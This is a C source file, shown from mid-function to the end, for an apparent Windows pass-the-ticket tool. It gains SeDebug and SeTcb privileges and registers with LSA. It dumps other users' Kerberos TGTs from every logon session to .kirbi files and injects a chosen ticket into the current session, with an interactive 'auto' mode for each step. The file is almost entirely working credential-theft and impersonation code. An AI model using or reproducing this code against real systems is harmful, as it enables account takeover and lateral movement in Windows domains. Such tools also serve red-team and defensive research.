    pkg.Length = 8;
    pkg.MaximumLength = 9;

    ULONG auth = 0;
    if (lkp_fn(lsa, &pkg, &auth) != 0) {
        PrintError("LsaLookupAuthenticationPackage failed");
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    // Query tickets for this LogonId
    KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
    cacheReq.MessageType = KerbQueryTicketCacheMessage;
    cacheReq.LogonId = targetLuid;

    PKERB_QUERY_TKT_CACHE_RESPONSE cacheRsp = NULL;
    ULONG sz = 0;
    NTSTATUS sub = 0;

    if (cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub) != 0 || sub != 0) {
        printf("Error: Failed to get ticket cache for LogonId 0x%lx\n", logonId);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    // Find the first TGT
    BOOL found = FALSE;
    wchar_t targetSrv[512] = { 0 };

    for (ULONG i = 0; i < cacheRsp->CountOfTickets; i++) {
        KERB_TICKET_CACHE_INFO* t = &cacheRsp->Tickets[i];
        wchar_t srv[512] = { 0 };

        if (t->ServerName.Buffer && t->ServerName.Length > 0) {
            size_t len = t->ServerName.Length / sizeof(WCHAR);
            if (len > 511) len = 511;
            wcsncpy(srv, t->ServerName.Buffer, len);
            srv[len] = L'\0';
        }

        if (wcsstr(srv, L"krbtgt")) {
            found = TRUE;
            wcsncpy(targetSrv, srv, 511);
            targetSrv[511] = L'\0';
            break;
        }
    }

    if (!found) {
        printf("Error: No TGT found for LogonId 0x%lx\n", logonId);
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    // Retrieve the ticket
    ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(targetSrv) * sizeof(WCHAR)));
    PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);

    if (!retReq) {
        PrintError("Memory allocation failed");
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    ZeroMemory(retReq, reqSize);
    retReq->MessageType = KerbRetrieveEncodedTicketMessage;
    retReq->LogonId = targetLuid;
    retReq->TicketFlags = 0;
    retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    retReq->EncryptionType = 0;
    retReq->TargetName.Length = (USHORT)(wcslen(targetSrv) * sizeof(WCHAR));
    retReq->TargetName.MaximumLength = retReq->TargetName.Length;
    retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    memcpy(retReq->TargetName.Buffer, targetSrv, retReq->TargetName.Length);

    PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
    ULONG retSz = 0;
    sub = 0;

    if (cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &sub) != 0 || sub != 0) {
        printf("Error: Failed to retrieve ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
            (unsigned long)0, (unsigned long)sub);
        free(retReq);
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    free(retReq);

    // Generate filename: 0xLOGONID_Username.kirbi
    char filename[1024];
    wchar_t cleanUserName[256] = { 0 };

    if (wcslen(userName) > 0) {
        wcsncpy(cleanUserName, userName, 255);
    }
    else {
        wcscpy(cleanUserName, L"unknown");
    }

    // Clean username for filename
    for (size_t i = 0; i < wcslen(cleanUserName); i++) {
        if (cleanUserName[i] == L'/' || cleanUserName[i] == L'\\' || cleanUserName[i] == L':' ||
            cleanUserName[i] == L'*' || cleanUserName[i] == L'?' || cleanUserName[i] == L'"' ||
            cleanUserName[i] == L'<' || cleanUserName[i] == L'>' || cleanUserName[i] == L'|' ||
            cleanUserName[i] == L'@' || cleanUserName[i] == L' ' || cleanUserName[i] == L'$') {
            cleanUserName[i] = L'_';
        }
    }

    sprintf(filename, "0x%lx_%ls.kirbi", logonId, cleanUserName);

    FILE* fp = fopen(filename, "wb");
    if (!fp) {
        printf("Error: Cannot create file %s\n", filename);
        fre_fn(retRsp);
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    fwrite(retRsp->Ticket.EncodedTicket, 1, retRsp->Ticket.EncodedTicketSize, fp);
    fclose(fp);

    printf("\n");
    PrintSuccess("TGT ticket exported successfully");
    printf("    LogonId: 0x%lx\n", logonId);
    wprintf(L"    User: %ls\\%ls\n", domain, userName);
    wprintf(L"    Server: %ls\n", targetSrv);
    printf("    File: %s\n", filename);
    printf("    Size: %lu bytes\n", (unsigned long)retRsp->Ticket.EncodedTicketSize);

    fre_fn(retRsp);
    fre_fn(cacheRsp);
    LsaDeregisterLogonProcess(lsa);
    fre_fn(session_list);
    FreeLibrary(h);
}

void AutoExportAndImport() {
    PrintDebug("Auto mode: Enumerating tickets and importing selected TGT...");

    // Reset TGT list
    g_tgtCount = 0;

    // Enable privileges
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }

        if (LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
        CloseHandle(hToken);
    }

    HMODULE h = LoadLibraryA("secur32.dll");
    PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
    PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
    PLSA_REGISTER_LOGON_PROCESS reg_fn = (PLSA_REGISTER_LOGON_PROCESS)GetProcAddress(h, "LsaRegisterLogonProcess");
    PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    ULONG session_cnt = 0;
    PLUID session_list = NULL;

    if (enum_fn(&session_cnt, &session_list) != 0) {
        PrintError("Failed to enumerate logon sessions");
        FreeLibrary(h);
        return;
    }

    HANDLE lsa = NULL;
    LSA_STRING lsaName;
    char lsaNameStr[] = "KlistClone";
    lsaName.Buffer = lsaNameStr;
    lsaName.Length = (USHORT)strlen(lsaNameStr);
    lsaName.MaximumLength = lsaName.Length + 1;
    LSA_OPERATIONAL_MODE mode = 0;

    NTSTATUS regStatus = reg_fn(&lsaName, &lsa, &mode);
    if (regStatus != 0) {
        PrintError("LsaRegisterLogonProcess failed - need Administrator privileges");
        FreeLibrary(h);
        fre_fn(session_list);
        return;
    }

    char krb[] = "Kerberos";
    LSA_STRING pkg;
    pkg.Buffer = krb;
    pkg.Length = 8;
    pkg.MaximumLength = 9;

    ULONG auth = 0;
    if (lkp_fn(lsa, &pkg, &auth) != 0) {
        PrintError("Failed to find Kerberos package");
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    // Enumerate and collect TGTs
    for (ULONG i = 0; i < session_cnt; i++) {
        PSECURITY_LOGON_SESSION_DATA session_data = NULL;
        if (get_fn(&session_list[i], &session_data) != 0 || !session_data) continue;

        wchar_t usr[256] = { 0 }, dom[256] = { 0 };

        if (session_data->UserName.Buffer && session_data->UserName.Length > 0) {
            size_t len = session_data->UserName.Length / sizeof(WCHAR);
            if (len > 255) len = 255;
            wcsncpy(usr, session_data->UserName.Buffer, len);
            usr[len] = L'\0';
        }

        if (session_data->LogonDomain.Buffer && session_data->LogonDomain.Length > 0) {
            size_t len = session_data->LogonDomain.Length / sizeof(WCHAR);
            if (len > 255) len = 255;
            wcsncpy(dom, session_data->LogonDomain.Buffer, len);
            dom[len] = L'\0';
        }

        KERB_QUERY_TKT_CACHE_REQUEST req;
        req.MessageType = KerbQueryTicketCacheMessage;
        req.LogonId = session_list[i];

        PKERB_QUERY_TKT_CACHE_RESPONSE rsp = NULL;
        ULONG sz = 0;
        NTSTATUS sub = 0;

        NTSTATUS status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);

        if (status == 0 && sub == 0 && rsp && rsp->CountOfTickets > 0) {
            for (ULONG j = 0; j < rsp->CountOfTickets; j++) {
                KERB_TICKET_CACHE_INFO* t = &rsp->Tickets[j];
                wchar_t srv[512] = { 0 };

                if (t->ServerName.Buffer && t->ServerName.Length > 0) {
                    size_t len = t->ServerName.Length / sizeof(WCHAR);
                    if (len > 511) len = 511;
                    wcsncpy(srv, t->ServerName.Buffer, len);
                    srv[len] = L'\0';
                }

                if (wcsstr(srv, L"krbtgt")) {
                    AddTGTToList(session_list[i].LowPart, usr, dom, srv);
                }
            }
            fre_fn(rsp);
        }
        fre_fn(session_data);
    }

    if (g_tgtCount == 0) {
        printf("\nNo TGTs found on the system.\n");
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    // Display TGTs
    printf("\n");
    PrintSeparator("AVAILABLE TGTs");
    printf("%-6s %-12s %-30s %-20s %s\n", "Index", "LogonId", "User", "Domain", "Service");
    printf("%-6s %-12s %-30s %-20s %s\n", "------", "------------", "------------------------------", "--------------------", "--------------------------------");

    for (ULONG i = 0; i < g_tgtCount; i++) {
        wprintf(L"%-6lu 0x%-10lx %-30ls %-20ls %ls\n",
            (unsigned long)(i + 1),
            (unsigned long)g_tgtList[i].logonId,
            g_tgtList[i].userName,
            g_tgtList[i].domain,
            g_tgtList[i].serviceName);
    }

    // Ask user to choose
    printf("\nChoose TGT to export and import (1-%lu), or 0 to cancel: ", (unsigned long)g_tgtCount);

    char input[10];
    if (fgets(input, sizeof(input), stdin) == NULL) {
        PrintError("Failed to read input");
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    int choice = atoi(input);
    if (choice <= 0 || choice > (int)g_tgtCount) {
        printf("Cancelled or invalid choice.\n");
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    ULONG selectedIdx = choice - 1;
    ULONG targetLogonId = g_tgtList[selectedIdx].logonId;
    wchar_t targetUserName[256];
    wcsncpy(targetUserName, g_tgtList[selectedIdx].userName, 255);
    targetUserName[255] = L'\0';

    printf("\n");
    wprintf(L"[*] Selected: #%d - 0x%lx (%ls)\n", choice, targetLogonId, targetUserName);

    // Find the session with this LogonId
    LUID targetLuid = { 0 };
    BOOL sessionFound = FALSE;

    for (ULONG i = 0; i < session_cnt; i++) {
        if (session_list[i].LowPart == targetLogonId) {
            targetLuid = session_list[i];
            sessionFound = TRUE;
            break;
        }
    }

    if (!sessionFound) {
        PrintError("Session not found");
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    // Query tickets for this LogonId
    KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
    cacheReq.MessageType = KerbQueryTicketCacheMessage;
    cacheReq.LogonId = targetLuid;

    PKERB_QUERY_TKT_CACHE_RESPONSE cacheRsp = NULL;
    ULONG sz = 0;
    NTSTATUS sub = 0;

    if (cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub) != 0 || sub != 0) {
        PrintError("Failed to get ticket cache");
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    // Find the TGT
    BOOL found = FALSE;
    wchar_t targetSrv[512] = { 0 };

    for (ULONG i = 0; i < cacheRsp->CountOfTickets; i++) {
        KERB_TICKET_CACHE_INFO* t = &cacheRsp->Tickets[i];
        wchar_t srv[512] = { 0 };

        if (t->ServerName.Buffer && t->ServerName.Length > 0) {
            size_t len = t->ServerName.Length / sizeof(WCHAR);
            if (len > 511) len = 511;
            wcsncpy(srv, t->ServerName.Buffer, len);
            srv[len] = L'\0';
        }

        if (wcsstr(srv, L"krbtgt")) {
            found = TRUE;
            wcsncpy(targetSrv, srv, 511);
            targetSrv[511] = L'\0';
            break;
        }
    }

    if (!found) {
        PrintError("TGT not found in cache");
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    // Retrieve the ticket
    ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(targetSrv) * sizeof(WCHAR)));
    PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);

    if (!retReq) {
        PrintError("Memory allocation failed");
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    ZeroMemory(retReq, reqSize);
    retReq->MessageType = KerbRetrieveEncodedTicketMessage;
    retReq->LogonId = targetLuid;
    retReq->TicketFlags = 0;
    retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    retReq->EncryptionType = 0;
    retReq->TargetName.Length = (USHORT)(wcslen(targetSrv) * sizeof(WCHAR));
    retReq->TargetName.MaximumLength = retReq->TargetName.Length;
    retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    memcpy(retReq->TargetName.Buffer, targetSrv, retReq->TargetName.Length);

    PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
    ULONG retSz = 0;
    sub = 0;

    if (cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &sub) != 0 || sub != 0) {
        printf("Error: Failed to retrieve ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
            (unsigned long)0, (unsigned long)sub);
        free(retReq);
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    free(retReq);

    PrintSuccess("Ticket retrieved successfully");
    printf("    Size: %lu bytes\n", (unsigned long)retRsp->Ticket.EncodedTicketSize);

    // Now import the ticket into current session
    printf("\n[*] Importing ticket into current session...\n");

    ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + retRsp->Ticket.EncodedTicketSize;
    PKERB_SUBMIT_TKT_REQUEST submitReq = (PKERB_SUBMIT_TKT_REQUEST)malloc(submitSize);

    if (!submitReq) {
        PrintError("Memory allocation failed");
        fre_fn(retRsp);
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    ZeroMemory(submitReq, submitSize);
    submitReq->MessageType = KerbSubmitTicketMessage;
    submitReq->LogonId.LowPart = 0;
    submitReq->LogonId.HighPart = 0;
    submitReq->Flags = 0;
    submitReq->KerbCredSize = retRsp->Ticket.EncodedTicketSize;
    submitReq->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);

    memcpy((PBYTE)submitReq + sizeof(KERB_SUBMIT_TKT_REQUEST),
        retRsp->Ticket.EncodedTicket,
        retRsp->Ticket.EncodedTicketSize);

    PVOID response = NULL;
    ULONG responseSz = 0;
    NTSTATUS submitSub = 0;

    NTSTATUS status = cal_fn(lsa, auth, submitReq, submitSize, &response, &responseSz, &submitSub);

    free(submitReq);

    if (status != 0 || submitSub != 0) {
        printf("Error: Failed to import ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
            (unsigned long)status, (unsigned long)submitSub);

        if (submitSub == 0xC000018B) {
            printf("Reason: Invalid or malformed ticket\n");
        }
        else if (submitSub == 0xC0000225) {
            printf("Reason: Domain not found\n");
        }
        else if (submitSub == 0xC000005E) {
            printf("Reason: No valid logon sessions\n");
        }

        if (response) fre_fn(response);
        fre_fn(retRsp);
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    printf("\n");
    PrintSuccess("TGT imported successfully into current session");
    wprintf(L"    LogonId: 0x%lx\n", targetLogonId);
    wprintf(L"    User: %ls\n", targetUserName);
    wprintf(L"    Service: %ls\n", targetSrv);
    printf("\n");
    PrintSuccess("Ticket is now available in your Kerberos cache");
    // printf("    You can verify with: klist\n");
    printf("\n");
    PrintSeparator("CURRENT SESSION TICKETS");
    EnumerateMyTickets();

    if (response) fre_fn(response);
    fre_fn(retRsp);
    fre_fn(cacheRsp);
    LsaDeregisterLogonProcess(lsa);
    fre_fn(session_list);
    FreeLibrary(h);
}

void PassTheTicket(const char* filename) {
    FILE* fp = fopen(filename, "rb");
    if (!fp) {
        printf("Error: Cannot open file %s\n", filename);
        return;
    }

    fseek(fp, 0, SEEK_END);
    long fileSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    if (fileSize <= 0 || fileSize > 10 * 1024 * 1024) {
        PrintError("Invalid file size");
        fclose(fp);
        return;
    }

    PBYTE ticketData = (PBYTE)malloc(fileSize);
    if (!ticketData) {
        PrintError("Memory allocation failed");
        fclose(fp);
        return;
    }

    size_t bytesRead = fread(ticketData, 1, fileSize, fp);
    fclose(fp);

    if (bytesRead != (size_t)fileSize) {
        PrintError("Failed to read complete file");
        free(ticketData);
        return;
    }

    HMODULE h = LoadLibraryA("secur32.dll");
    if (!h) {
        PrintError("Failed to load secur32.dll");
        free(ticketData);
        return;
    }

    PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
    PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    if (!con_fn || !lkp_fn || !cal_fn || !fre_fn) {
        PrintError("Failed to get LSA functions");
        free(ticketData);
        FreeLibrary(h);
        return;
    }

    HANDLE lsa = NULL;
    if (con_fn(&lsa) != 0) {
        PrintError("LsaConnectUntrusted failed");
        free(ticketData);
        FreeLibrary(h);
        return;
    }

    char krb[] = "Kerberos";
    LSA_STRING pkg;
    pkg.Buffer = krb;
    pkg.Length = 8;
    pkg.MaximumLength = 9;

    ULONG auth = 0;
    if (lkp_fn(lsa, &pkg, &auth) != 0) {
        PrintError("LsaLookupAuthenticationPackage failed");
        LsaDeregisterLogonProcess(lsa);
        free(ticketData);
        FreeLibrary(h);
        return;
    }

    ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + fileSize;
    PKERB_SUBMIT_TKT_REQUEST submitReq = (PKERB_SUBMIT_TKT_REQUEST)malloc(submitSize);

    if (!submitReq) {
        PrintError("Memory allocation failed");
        LsaDeregisterLogonProcess(lsa);
        free(ticketData);
        FreeLibrary(h);
        return;
    }

    ZeroMemory(submitReq, submitSize);
    submitReq->MessageType = KerbSubmitTicketMessage;
    submitReq->LogonId.LowPart = 0;
    submitReq->LogonId.HighPart = 0;
    submitReq->Flags = 0;
    submitReq->KerbCredSize = (ULONG)fileSize;
    submitReq->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);

    memcpy((PBYTE)submitReq + sizeof(KERB_SUBMIT_TKT_REQUEST), ticketData, fileSize);

    PVOID response = NULL;
    ULONG responseSz = 0;
    NTSTATUS sub = 0;

    NTSTATUS status = cal_fn(lsa, auth, submitReq, submitSize, &response, &responseSz, &sub);

    free(submitReq);
    free(ticketData);

    if (status != 0 || sub != 0) {
        printf("Error: Failed to import ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
            (unsigned long)status, (unsigned long)sub);

        if (sub == 0xC000018B) {
            printf("Reason: Invalid or malformed ticket\n");
        }
        else if (sub == 0xC0000225) {
            printf("Reason: Domain not found\n");
        }
        else if (sub == 0xC000005E) {
            printf("Reason: No valid logon sessions\n");
        }

        if (response) fre_fn(response);
        LsaDeregisterLogonProcess(lsa);
        FreeLibrary(h);
        return;
    }

    printf("\n");
    PrintSuccess("Ticket imported successfully into memory");
    printf("    File: %s\n", filename);
    printf("    Size: %ld bytes\n", fileSize);
    printf("\n");
    PrintSuccess("Ticket is now available in Kerberos cache");
    printf("    You can verify with: autoptt.exe klist\n");

    if (response) fre_fn(response);
    LsaDeregisterLogonProcess(lsa);
    FreeLibrary(h);
}

int main(int argc, char* argv[]) {
    (void)_setmode(_fileno(stdout), _O_U16TEXT);
    (void)_setmode(_fileno(stdout), _O_TEXT);

    if (argc > 1 && _stricmp(argv[1], "sessions") == 0) {
        PrintCurrentLogonId();
        EnumerateLogonSessions();
    }
    else if (argc > 1 && _stricmp(argv[1], "klist") == 0) {
        PrintCurrentLogonId();
        EnumerateMyTickets();
    }
    else if (argc > 1 && _stricmp(argv[1], "tickets") == 0) {
        PrintCurrentLogonId();
        EnumerateAllTickets();
    }
    else if (argc > 1 && _stricmp(argv[1], "auto") == 0) {
        PrintCurrentLogonId();
        AutoExportAndImport();
    }
    else if (argc > 2 && _stricmp(argv[1], "export") == 0) {
        ExportTicket(argv[2]);
    }
    else if (argc > 2 && _stricmp(argv[1], "ptt") == 0) {
        PassTheTicket(argv[2]);
    }
    else {
        printf("Kerberos Sessions and Tickets Enumerator\n\n");
        printf("Usage:\n");
        printf("  %s sessions         - Enumerate logon sessions (like 'klist sessions')\n", argv[0]);
        printf("  %s klist            - Enumerate MY tickets (current session)\n", argv[0]);
        printf("  %s tickets          - Enumerate ALL tickets from ALL sessions\n", argv[0]);
        printf("  %s auto             - Interactive: list TGTs and import selected one\n", argv[0]);
        printf("  %s export <LogonId> - Export TGT by LogonId (hex format)\n", argv[0]);
        printf("  %s ptt <file>       - Import .kirbi ticket\n\n", argv[0]);

        printf("Examples:\n");
        printf("  %s sessions\n", argv[0]);
        printf("  %s klist\n", argv[0]);
        printf("  %s tickets          # View tickets from ALL sessions with Base64\n", argv[0]);
        printf("  %s auto             # Interactive mode to import a TGT\n", argv[0]);
        printf("  %s export 0x79fb3   # Export TGT for LogonId 0x79fb3\n", argv[0]);
        printf("  %s ptt 0x79fb3_Administrator.kirbi\n", argv[0]);
    }

    return 0;
}